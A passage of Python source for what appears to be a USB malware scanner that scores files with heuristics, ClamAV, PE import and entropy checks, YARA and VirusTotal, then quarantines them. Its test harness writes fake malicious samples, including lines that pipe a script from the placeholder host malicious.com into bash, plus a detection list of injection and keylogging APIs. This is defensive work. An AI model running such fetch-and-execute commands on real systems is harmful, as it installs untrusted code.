        key = (m.get("type"), str(m.get("pattern")))
        if key not in seen:
            seen.add(key)
            uniq.append(m)
    
    if DEBUG_MODE:
        _write_log(f"[DEBUG] builtin_scan({path}) -> {uniq}", DEBUG_LOG_FILE)
    return uniq

# ---------------- Enhanced Explanation helper ----------------
def explanation_for_reasons(reasons):
    lines = []
    if reasons is None:
        return lines
    
    def add_block(title, risk, immediate, prevention):
        lines.append(f"Type: {title}")
        lines.append(f"Risk: {risk}")
        lines.append(f"What happens if run: {immediate}")
        lines.append(f"Immediate steps: DO NOT run; disconnect device; analyze in VM or sandbox.")
        lines.append(f"Prevention: {prevention}")
        lines.append("")
    
    if isinstance(reasons, dict):
        for k, v in reasons.items():
            if k == "fallback" and isinstance(v, list):
                for r in v:
                    typ = r.get("type") if isinstance(r, dict) else None
                    pat = r.get("pattern") if isinstance(r, dict) else str(r)
                    if typ == "filename":
                        if "double_extension" in str(pat):
                            add_block("Double Extension Attack", "File disguised with fake extension to trick users.", 
                                    "Executes malicious code when opened.", "Always check full filename; enable 'show file extensions'.")
                        elif "fake_system" in str(pat):
                            add_block("Fake System Process", "Malware impersonating legitimate Windows process.", 
                                    "May steal data, create backdoor, or cause system instability.", "Only run system files from System32 folder.")
                        else:
                            add_block("Suspicious Filename", "May auto-launch or trick users.", 
                                    "May cause execution when device is accessed.", "Disable autorun; scan first.")
                    elif typ == "lnk":
                        add_block("Malicious Shortcut (.lnk)", "Points to cmd/powershell or UNC paths.", 
                                "Can execute system utilities or download malware when opened.", "Do not open unknown shortcuts.")
                    elif typ == "pe":
                        add_block("Suspicious PE APIs", f"Contains {pat} API", 
                                "May inject into processes, log keystrokes, or download payloads.", "Do not execute; analyze in sandbox.")
                    elif typ == "content":
                        if "Keylogger" in str(pat):
                            add_block("Keylogger Detection", "Contains keylogging API calls.", 
                                    "Will record all keystrokes including passwords.", "Do not run; may steal credentials.")
                        elif "Downloader" in str(pat):
                            add_block("Downloader Trojan", "Contains download APIs.", 
                                    "Will download and execute additional malware.", "Block network access; quarantine.")
                        elif "Ransomware" in str(pat):
                            add_block("Ransomware Indicators", "Contains encryption APIs.", 
                                    "May encrypt files and demand ransom payment.", "Disconnect immediately; restore from backup.")
                        else:
                            add_block(f"Suspicious Content: {pat}", "Strings commonly found in malware.", 
                                    "May drop or execute payloads.", "Analyze in isolated environment.")
                    elif typ == "elf_analysis":
                        add_block("Linux ELF Malware", "Suspicious executable characteristics detected", 
                                "May install persistence, keylogger, or backdoor", "Do not execute; analyze in sandbox")
                    elif typ == "macho_analysis":
                        add_block("macOS Mach-O Malware", "Suspicious macOS executable detected",
                                "May gain persistence via launchd or install keylogger", "Do not run on Mac systems")
                    elif typ == "linux_script":
                        add_block("Malicious Linux Script", "Suspicious shell script patterns",
                                "May download malware, modify system files, or create backdoors", "Do not execute; review script content")
                    elif typ == "mac_script":
                        add_block("Malicious macOS Script", "Suspicious AppleScript or shell script",
                                "May request admin privileges or install persistence", "Do not run; check script source")
                    elif typ == "cross_platform_script":
                        add_block("Cross-Platform Malicious Script", "Suspicious Python/Node.js/Ruby code",
                                "May run on multiple platforms, steal data, or download malware", "Do not execute; analyze code")
                    else:
                        add_block("Suspicious Pattern", f"Pattern: {pat}", "Could be malicious.", "Do not execute; analyze.")
            elif k == "yara":
                rules = v if isinstance(v, (list, tuple)) else [v]
                for rule in rules:
                    add_block(f"YARA Detection: {rule}", "YARA signature matched; indicates heuristic detection.", 
                            "Behavior matches known malware patterns.", "Submit sample to sandbox for analysis.")
            elif k == "clamav":
                add_block("Antivirus Detection", f"ClamAV flagged: {v}", "Known malicious sample in AV database.", 
                        "Quarantine immediately and scan entire system.")
            elif k == "pe":
                add_block("PE Heuristic Analysis", f"{v}", "Suspicious executable characteristics detected.", 
                        "May use packing, obfuscation, or suspicious imports.", "Do not execute; analyze in VM.")
            elif k == "virustotal":
                add_block("VirusTotal Detection", f"{v}", "Multiple antivirus engines detected this as malicious.", 
                        "Confirmed threat by crowd-sourced analysis.", "Quarantine immediately and scan system.")
            else:
                add_block(str(k), str(v), "Unknown threat — treat as suspicious.", "Do not execute; isolate and analyze.")
    elif isinstance(reasons, list):
        for r in reasons:
            add_block(str(r), "Pattern match", "Possibly malicious.", "Do not execute; analyze in a VM.")
    else:
        add_block("Suspicious", str(reasons), "Possibly malicious.", "Do not execute; analyze in a VM.")
    
    if len(lines) > 200:
        lines = lines[:200] + ["(Truncated explanation...)"]
    return lines

# ---------------- Safe quarantine & evidence ----------------
def compute_hashes(path):
    out = {"sha256": None, "ssdeep": None}
    try:
        sha256 = hashlib.sha256()
        with open(path, "rb") as f:
            for chunk in iter(lambda: f.read(8192), b""):
                sha256.update(chunk)
        out["sha256"] = sha256.hexdigest()
    except Exception:
        out["sha256"] = None
    
    if SSDEEP_AVAILABLE:
        try:
            if hasattr(ssdeep, "hash_from_file"):
                out["ssdeep"] = ssdeep.hash_from_file(path)
            else:
                data = open(path, "rb").read()
                out["ssdeep"] = ssdeep.hash(data)
        except Exception:
            out["ssdeep"] = None
    return out

def quarantine_copy(src_path, quarantine_dir, reason, drive_label, auto_delete=False):
    try:
        os.makedirs(quarantine_dir, exist_ok=True)
        basename = os.path.basename(src_path)
        dest_name = f"{basename}_{int(time.time())}"
        dest_path = os.path.join(quarantine_dir, dest_name)
        
        shutil.copy2(src_path, dest_path)
        hashes = compute_hashes(dest_path)
        
        # Fix deprecation warning - use timezone-aware datetime
        try:
            from datetime import timezone
            detected_time = datetime.now(timezone.utc).isoformat()
        except Exception:
            detected_time = datetime.utcnow().isoformat() + "Z"
        
        evidence = {
            "original_path": src_path,
            "quarantine_path": dest_path,
            "detected_at": detected_time,
            "drive_label": drive_label,
            "reason": reason,
            "hashes": hashes
        }
        
        evid_path = dest_path + ".evidence.json"
        with open(evid_path, "w", encoding="utf-8") as ef:
            json.dump(evidence, ef, indent=2)
        
        st = os.stat(dest_path)
        new_mode = st.st_mode & ~(stat.S_IWUSR | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
        os.chmod(dest_path, new_mode)
        
        if DEBUG_MODE:
            _write_log(f"[DEBUG] quarantine_copy created {dest_path} and {evid_path}", DEBUG_LOG_FILE)
        
        if auto_delete:
            try:
                os.remove(src_path)
            except Exception as e:
                log_threat(src_path, f"Failed to delete original after quarantine: {e}")
        return dest_path
    except Exception as e:
        log_threat(src_path, f"Quarantine copy error: {e}")
        if DEBUG_MODE:
            import traceback
            _write_log(f"[DEBUG] Quarantine traceback: {traceback.format_exc()}", DEBUG_LOG_FILE)
        return None

# ---------------- Report generation ----------------
def save_explanation_report(moved_sample_path, drive_label, reasons):
    try:
        base = os.path.basename(moved_sample_path)
        name, _ = os.path.splitext(base)
        ts = int(time.time())
        rpt_name = f"{name}.{ts}.report.txt"
        rpt_path = os.path.join(QUARANTINE_DIR, rpt_name)
        expl_lines = explanation_for_reasons(reasons)
        
        with open(rpt_path, "w", encoding="utf-8") as rf:
            rf.write(f"Original drive: {drive_label}\n")
            rf.write(f"Sample moved: {moved_sample_path}\n")
            rf.write(f"Detected at: {now_ts()}\n\n")
            rf.write("Explanation & Guidance:\n")
            rf.write("\n".join(expl_lines))
        return rpt_path
    except Exception as e:
        _write_log(f"[ERROR] save_explanation_report: {e}", DEBUG_LOG_FILE)
        return None

def simple_report_console(path, drive_label, status, reasons=None):
    if status == "SAFE":
        print(f"{COLOR_SAFE}[SAFE]{COLOR_RESET} {path}", flush=True)
        log_history(path, "SAFE")
    else:
        try:
            basename = os.path.basename(path)
            # Always quarantine and delete original from USB
            dest = quarantine_copy(path, QUARANTINE_DIR, reasons, drive_label, auto_delete=True)
            if not dest:
                err_msg = f"Failed to quarantine {path} - check file permissions and disk space"
                log_threat(path, err_msg)
                print(f"{COLOR_MAL}[ERROR]{COLOR_RESET} {err_msg}", flush=True)
                return
            
            expl_lines = explanation_for_reasons(reasons)
            expl_text = " | ".join(expl_lines[:6]) if expl_lines else "No detailed explanation."
            log_history(path, "MALICIOUS - QUARANTINED & REMOVED")
            log_threat(path, expl_text)
            
            rpt = save_explanation_report(dest, drive_label, reasons)
            print(f"{COLOR_MAL}[MALICIOUS]{COLOR_RESET} {basename} -> removed from USB & quarantined", flush=True)
            if rpt:
                print(f"{COLOR_REPORT}[REPORT]{COLOR_RESET} Report: {os.path.basename(rpt)}", flush=True)
        except Exception as e:
            log_threat(path, f"Error quarantining file: {e}")
            print(f"{COLOR_MAL}[ERROR]{COLOR_RESET} Could not quarantine {path}: {e}", flush=True)

# ---------------- ClamAV detection ----------------
def find_clamscan():
    from shutil import which
    return which("clamscan") or which("clamscan.exe")

CLAMSCAN_PATH = find_clamscan()
if CLAMSCAN_PATH:
    info(f"clamscan found: {CLAMSCAN_PATH}")
else:
    info("clamscan not found; skipped.")

def clamav_scan(path):
    if not CLAMSCAN_PATH:
        return ("no_clam", "", [])
    try:
        proc = subprocess.run([CLAMSCAN_PATH, "--no-summary", path], capture_output=True, text=True, timeout=30)
        out = (proc.stdout or "") + (proc.stderr or "")
        infected = [line.split(":")[-1].strip() for line in out.splitlines() if line.strip().endswith(" FOUND")]
        return ("infected", out, infected) if infected else ("clean", out, [])
    except Exception as e:
        return ("error", str(e), [])

# ---------------- Platform-specific drive detection ----------------
def get_windows_drive_type(letter_path):
    try:
        import ctypes
        GetDriveTypeW = ctypes.windll.kernel32.GetDriveTypeW
        return GetDriveTypeW(ctypes.c_wchar_p(letter_path))
    except Exception:
        return None

def get_windows_volume_label(drive_path):
    try:
        import ctypes
        vol_name_buf = ctypes.create_unicode_buffer(1024)
        fs_name_buf = ctypes.create_unicode_buffer(1024)
        serial = ctypes.c_uint()
        max_len = ctypes.c_uint()
        flags = ctypes.c_uint()
        ret = ctypes.windll.kernel32.GetVolumeInformationW(
            ctypes.c_wchar_p(drive_path),
            vol_name_buf,
            ctypes.sizeof(vol_name_buf),
            ctypes.byref(serial),
            ctypes.byref(max_len),
            ctypes.byref(flags),
            fs_name_buf,
            ctypes.sizeof(fs_name_buf)
        )
        if ret != 0:
            label = vol_name_buf.value
            if label:
                return f"{label} ({drive_path})"
            return drive_path
    except Exception:
        pass
    return drive_path

def get_unix_volume_label(mountpoint):
    label = None
    try:
        import psutil
        device = next((p.device for p in psutil.disk_partitions(all=False) if os.path.abspath(p.mountpoint) == os.path.abspath(mountpoint)), None)
        if device:
            for cmd in [["blkid", "-s", "LABEL", "-o", "value", device], ["lsblk", "-no", "LABEL", device]]:
                try:
                    proc = subprocess.run(cmd, capture_output=True, text=True, timeout=2)
                    out = (proc.stdout or "").strip()
                    if out:
                        label = out
                        break
                except Exception:
                    continue
    except Exception:
        pass
    if label:
        return f"{label} ({mountpoint})"
    name = os.path.basename(mountpoint.rstrip(os.sep))
    return f"{name} ({mountpoint})" if name else mountpoint

def get_drive_label(mountpoint):
    return get_windows_volume_label(mountpoint) if sys.platform.startswith("win") else get_unix_volume_label(mountpoint)

def detect_removable_drives():
    drives = set()
    try:
        import psutil
        for part in psutil.disk_partitions(all=False):
            mp = part.mountpoint
            if sys.platform.startswith("win"):
                try:
                    dt = get_windows_drive_type(mp)
                    if dt == 2:
                        drives.add(mp)
                except Exception:
                    continue
            else:
                if any(mp.startswith(prefix) for prefix in ("/media", "/mnt", "/run/media", "/Volumes")):
                    drives.add(mp)
    except Exception:
        if sys.platform.startswith("win"):
            for L in "DEFGHIJKLMNOPQRSTUVWXYZ":
                p = f"{L}:\\" 
                if os.path.exists(p) and not p.upper().startswith("C:\\"):
                    drives.add(p)
        else:
            for root in ("/media", "/mnt", "/run/media", "/Volumes"):
                if os.path.isdir(root):
                    for entry in os.listdir(root):
                        mp = os.path.join(root, entry)
                        if os.path.ismount(mp):
                            drives.add(mp)
    final = []
    for d in sorted(drives):
        try:
            if os.path.exists(d) and (os.path.ismount(d) or sys.platform.startswith("win")):
                final.append(d)
        except Exception:
            continue
    return final

# ---------------- Enhanced PE analysis ----------------
def pe_quick_check(path):
    if not PEFILE_AVAILABLE:
        return None
    try:
        size = os.path.getsize(path)
        if size < 2:
            return None
        with open(path, "rb") as fh:
            header = fh.read(2)
        if header[:2] != b"MZ":
            return None
        
        import pefile as _pe
        pe = _pe.PE(path, fast_load=True)
        suspicious = []
        
        # Enhanced suspicious import detection
        suspicious_apis = [
            "createremotethread", "virtualallocex", "writeprocessmemory",
            "rundll", "loadlibrary", "getasynckeystate", "setwindowshookex",
            "urldownloadtofile", "internetopen", "httpsendrequesta",
            "regsetvalueex", "regcreatekey", "isdebuggerpresent",
            "checkremotedebugger", "ntquerysysteminformation",
            "zwquerysysteminformation", "rtladjustprivilege",
            "openprocess", "terminateprocess", "createtoolhelp32snapshot",
            "cryptencrypt", "cryptdecrypt"
        ]
        
        for entry in getattr(pe, "DIRECTORY_ENTRY_IMPORT", []) or []:
            dll = entry.dll.decode(errors="ignore") if getattr(entry, "dll", None) else ""
            for imp in getattr(entry, "imports", []) or []:
                name = imp.name.decode(errors="ignore") if getattr(imp, "name", None) else ""
                name_l = name.lower()
                if any(api in name_l for api in suspicious_apis):
                    suspicious.append(name or dll or "import_suspicious")
        
        # Enhanced entropy calculation
        max_ent = 0.0
        high_entropy_sections = []
        try:
            from math import log2
            def entropy(data):
                if not data:
                    return 0.0
                counts = [0]*256
                for b in data:
                    counts[b]+=1
                ent = 0.0
                ln = len(data)
                for c in counts:
                    if c:
                        p = c/ln
                        ent -= p * log2(p)
                return ent
            
            for s in getattr(pe, "sections", []) or []:
                try:
                    data = s.get_data()[:4096]
                    sect_ent = entropy(data)
                    sect_name = s.Name.decode(errors="ignore").strip('\x00')
                    
                    # Lower threshold for .text/.code sections (6.5)
                    # Higher threshold for other sections (7.5)
                    threshold = 6.5 if sect_name.lower() in ['.text', '.code'] else 7.5
                    
                    if sect_ent > threshold:
                        high_entropy_sections.append({
                            "name": sect_name,
                            "entropy": round(sect_ent, 3)
                        })
                    max_ent = max(max_ent, sect_ent)
                except Exception:
                    continue
        except Exception:
            max_ent = 0.0
        
        return {
            "suspicious_imports": suspicious,
            "max_section_entropy": round(max_ent, 3),
            "high_entropy_sections": high_entropy_sections
        }
    except Exception:
        return None

# ---------------- File stabilization ----------------
def wait_for_stable_size(path, timeout=STABLE_WAIT_TIMEOUT, interval=0.5):
    try:
        prev = -1
        elapsed = 0.0
        while True:
            if not os.path.exists(path):
                return False
            size = os.path.getsize(path)
            if size == prev:
                return True
            prev = size
            time.sleep(interval)
            elapsed += interval
            if elapsed >= timeout:
                return size == prev
    except Exception:
        return False

# ---------------- Watchdog event handler ----------------
if WATCHDOG_AVAILABLE:
    class USBEventHandler(FileSystemEventHandler):
        def __init__(self, mountpoint, drive_label):
            self.mountpoint = mountpoint
            self.drive_label = drive_label
        
        def on_created(self, event):
            if event.is_directory:
                return
            path = event.src_path
            if wait_for_stable_size(path):
                scan_file(path, self.mountpoint, self.drive_label)
        
        def on_modified(self, event):
            self.on_created(event)

    def start_watchdog_for_mount(mountpoint):
        try:
            drive_label = get_drive_label(mountpoint)
            handler = USBEventHandler(mountpoint, drive_label)
            obs = Observer()
            obs.schedule(handler, mountpoint, recursive=True)
            obs.start()
            if DEBUG_MODE:
                _write_log(f"[DEBUG] watchdog started for {mountpoint}", DEBUG_LOG_FILE)
            return obs
        except Exception as e:
            _write_log(f"[DEBUG] watchdog failed for {mountpoint}: {e}", DEBUG_LOG_FILE)
            return None
else:
    def start_watchdog_for_mount(mountpoint):
        return None

# ---------------- Enhanced Scanning logic ----------------
_scanning_lock = threading.Lock()
_scanning_set = set()

def should_run_yara(path):
    try:
        size = os.path.getsize(path)
    except Exception:
        return False
    if size > YARA_MAX_SIZE:
        return False
    ext = os.path.splitext(path)[1].lower()
    return ext in YARA_TARGET_EXTS

def scan_file(path, drive_root, drive_label):
    try:
        if not os.path.exists(path):
            simple_report_console(path, drive_label, "SAFE", reasons="skipped - not found")
            return

        # Platform-specific executable analysis
        if CURRENT_PLATFORM == "linux":
            elf_result = elf_quick_check(path)
            if elf_result:
                simple_report_console(path, drive_label, "MALICIOUS", {"elf_analysis": elf_result})
                return
                
        elif CURRENT_PLATFORM == "mac":
            macho_result = macho_quick_check(path)
            if macho_result:
                simple_report_console(path, drive_label, "MALICIOUS", {"macho_analysis": macho_result})
                return
        
        # Cross-platform script analysis
        ext = os.path.splitext(path)[1].lower()
        if ext in ['.py', '.js', '.node', '.rb', '.pl', '.php', '.sh', '.bash']:
            script_result = analyze_cross_platform_scripts(path)
            if script_result:
                simple_report_console(path, drive_label, "MALICIOUS", {"cross_platform_script": script_result})
                return

        # ClamAV scan
        try:
            if CLAMSCAN_PATH:
                cstat = clamav_scan(path)
                if cstat[0] == "infected":
                    reasons = {"clamav": cstat[2]}
                    simple_report_console(path, drive_label, "MALICIOUS", reasons)
                    return
        except Exception:
            pass

        # Enhanced PE analysis (Windows)
        try:
            pe_res = pe_quick_check(path)
            if pe_res:
                suspicious_count = len(pe_res.get("suspicious_imports", []))
                high_ent_count = len(pe_res.get("high_entropy_sections", []))
                
                # Flag if suspicious imports OR multiple high entropy sections
                if suspicious_count > 0 or high_ent_count > 1:
                    simple_report_console(path, drive_label, "MALICIOUS", {"pe": pe_res})
                    return
        except Exception:
            pass

        # Enhanced fallback heuristics
        try:
            fb = builtin_scan(path)
            if fb:
                simple_report_console(path, drive_label, "MALICIOUS", {"fallback": fb})
                return
        except Exception:
            pass

        # YARA scan
        try:
            if compiled_rules is not None and should_run_yara(path):
                matches = compiled_rules.match(path, timeout=10)
                if matches:
                    mlist = [getattr(m, "rule", None) for m in matches]
                    simple_report_console(path, drive_label, "MALICIOUS", {"yara": mlist})
                    return
        except Exception:
            pass

        # VirusTotal scan for suspicious files (optional)
        if VIRUSTOTAL_ENABLED and VIRUSTOTAL_API_KEY:
            try:
                # Only scan files that are somewhat suspicious but not caught by other methods
                file_size = os.path.getsize(path)
                if file_size < 10 * 1024 * 1024:  # Only scan files under 10MB for VT
                    print(f"{COLOR_VT}[VT]{COLOR_RESET} Submitting {os.path.basename(path)} to VirusTotal...")
                    success, vt_result, error = virustotal_scan_file(path, VIRUSTOTAL_API_KEY, VIRUSTOTAL_TIMEOUT)
                    
                    if success:
                        # Check if any antivirus engines detected it as malicious
                        stats = vt_result.get('stats', {})
                        malicious_count = stats.get('malicious', 0)
                        suspicious_count = stats.get('suspicious', 0)
                        
                        if malicious_count > 0 or suspicious_count > 0:
                            reasons = {
                                "virustotal": f"{malicious_count} engines detected as malicious, {suspicious_count} as suspicious",
                                "vt_details": vt_result
                            }
                            simple_report_console(path, drive_label, "MALICIOUS", reasons)
                            return
                        else:
                            print(f"{COLOR_VT}[VT]{COLOR_RESET} VirusTotal: No threats detected")
                    else:
                        print(f"{COLOR_VT}[VT]{COLOR_RESET} VirusTotal scan failed: {error}")
            except Exception as e:
                print(f"{COLOR_VT}[VT]{COLOR_RESET} VirusTotal error: {e}")

        # File is clean
        simple_report_console(path, drive_label, "SAFE", None)
    except Exception as e:
        info(f"Error scanning file {path}: {e}")
        try:
            simple_report_console(path, drive_label, "SAFE", f"scan_error: {e}")
        except Exception:
            pass

def scan_drive(mountpoint):
    drive_label = get_drive_label(mountpoint)
    with _scanning_lock:
        if mountpoint in _scanning_set:
            return
        _scanning_set.add(mountpoint)
    try:
        ok(f"New removable USB detected: {drive_label}")
        star(f"Scanning drive: {drive_label}")
        
        file_list = []
        for root, dirs, files in os.walk(mountpoint):
            for fname in files:
                fp = os.path.join(root, fname)
                file_list.append(fp)
        
        if file_list:
            # Scan files one by one (sequential) for better output alignment
            for fp in file_list:
                try:
                    scan_file(fp, mountpoint, drive_label)
                except Exception as e:
                    _write_log(f"[DEBUG] scan task failed for {fp}: {e}", DEBUG_LOG_FILE)
        
        ok(f"Drive scan complete: {drive_label}")
        ok(f"USB is now clean - only safe files remain")
    finally:
        with _scanning_lock:
            _scanning_set.discard(mountpoint)

# ---------------- Enhanced Banner ----------------
BANNER = r"""

██████╗ ██████╗  █████╗ ██╗  ██╗██╗ ██████╗ ███╗   ██╗     ██████╗    ██╗
██╔══██╗██╔══██╗██╔══██╗╚██╗██╔╝██║██╔═══██╗████╗  ██║    ██╔═████╗  ███║
██████╔╝██████╔╝███████║ ╚███╔╝ ██║██║   ██║██╔██╗ ██║    ██║██╔██║  ╚██║
██╔═══╝ ██╔══██╗██╔══██║ ██╔██╗ ██║██║   ██║██║╚██╗██║    ████╔╝██║   ██║
██║     ██║  ██║██║  ██║██╔╝ ██╗██║╚██████╔╝██║ ╚████║    ╚██████╔╝██╗██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝     ╚═════╝ ╚═╝╚═╝
                                                                          
 Commonn Malware Detection - Version 0.2     
 Windows PE | Linux ELF | macOS Mach-O | Cross-Platform Scripts
 Scanning USB & removable drives in real-time   
 Optional VirusTotal API integration        
                            
"""


# ---------------- Enhanced Test harness ----------------
def create_test_samples(target_dir):
    os.makedirs(target_dir, exist_ok=True)
    try:
        with open(os.path.join(target_dir, "autorun.inf"), "w", encoding="utf-8") as f:
            f.write("[AutoRun]\nopen=malicious.exe\naction=Open malicious\n")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "bad_shortcut.lnk"), "wb") as f:
            f.write(b"\x4C\x00\x00\x00")
            f.write(b"..." * 50)
            f.write(b"cmd.exe")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "dropper.ps1"), "w", encoding="utf-8") as f:
            f.write("powershell -EncodedCommand " + "A"*200 + "\n")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "dropper.exe"), "wb") as f:
            f.write(b"MZ")
            f.write(b"\x00" * 100)
            f.write(b"CreateRemoteThread")
            f.write(b"GetAsyncKeyState")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "macro.docm"), "w", encoding="utf-8") as f:
            f.write("AutoOpen()\nCreateObject(\"WScript.Shell\")\n")
    except Exception:
        pass
    try:
        with open(os.path.join(target_dir, "fake.pdf.exe"), "wb") as f:
            f.write(b"MZ")
            f.write(b"\x00" * 100)
            f.write(b"URLDownloadToFile")
    except Exception:
        pass
    
    # Cross-platform test samples
    try:
        with open(os.path.join(target_dir, "suspicious_linux_elf"), "wb") as f:
            f.write(b'\x7fELF')
            f.write(b"\x00" * 100)
            f.write(b"/etc/passwd")
            f.write(b"ptrace")
    except Exception:
        pass
    
    try:
        with open(os.path.join(target_dir, "malicious_script.py"), "w", encoding="utf-8") as f:
            f.write("import os, subprocess\nsubprocess.call(['curl', 'http://malicious.com/payload.sh', '|', 'sh'])\n")
    except Exception:
        pass
    
    try:
        with open(os.path.join(target_dir, "suspicious_shell.sh"), "w", encoding="utf-8") as f:
            f.write("#!/bin/bash\ncurl http://malicious.com/payload | bash\n")
    except Exception:
        pass

# ---------------- Main ----------------
def main():
    global VIRUSTOTAL_ENABLED
    
    print(BANNER)
    ensure_dependencies()
    load_builtin_rules()
    
    # Display platform info
    info(f"Running on platform: {CURRENT_PLATFORM}")
    if CURRENT_PLATFORM == "linux":
        info("Linux ELF analysis enabled")
    elif CURRENT_PLATFORM == "mac":
        info("macOS Mach-O analysis enabled")
    elif CURRENT_PLATFORM == "windows":
        info("Windows PE analysis enabled")
    
    # Check VirusTotal configuration
    if VIRUSTOTAL_ENABLED:
        if not VIRUSTOTAL_API_KEY:
            warn("VirusTotal enabled but no API key provided. Use --vt-api-key or set VIRUSTOTAL_API_KEY environment variable.")
            VIRUSTOTAL_ENABLED = False
        elif not VIRUSTOTAL_AVAILABLE:
            warn("VirusTotal enabled but vt-py package not available. Install with: pip install vt-py")
            VIRUSTOTAL_ENABLED = False
        else:
            ok("VirusTotal API integration enabled")
    
    info("=== Praxion Started ===")

    if RUN_TEST_MODE:
        td = os.path.join(tempfile.gettempdir(), "praxion_test_samples")
        create_test_samples(td)
        info(f"Test mode: scanning sample folder {td}")
        scan_drive(td)
        info("Test mode complete. Check logs and suspicious/ directory.")
        return

    seen = set(detect_removable_drives())
    observers = []
    
    if not seen:
        info("No removable USB drives currently detected.")
        info("Waiting for USB devices to be connected...")
    else:
        for d in sorted(seen):
            t = threading.Thread(target=scan_drive, args=(d,), daemon=True)
            t.start()
            obs = start_watchdog_for_mount(d)
            if obs:
                observers.append(obs)

    try:
        while True:
            current = set(detect_removable_drives())
            new = current - seen
            removed = seen - current
            
            for d in sorted(new):
                t = threading.Thread(target=scan_drive, args=(d,), daemon=True)
                t.start()
                obs = start_watchdog_for_mount(d)
                if obs:
                    observers.append(obs)
            
            for d in sorted(removed):
                info(f"Removable USB drive removed: {d}")
            
            seen = current
            time.sleep(POLL_INTERVAL)
    except KeyboardInterrupt:
        info("Scanner stopped by user.")
        for o in observers:
            try:
                o.stop()
                o.join(1)
            except Exception:
                pass

if __name__ == "__main__":
    main()
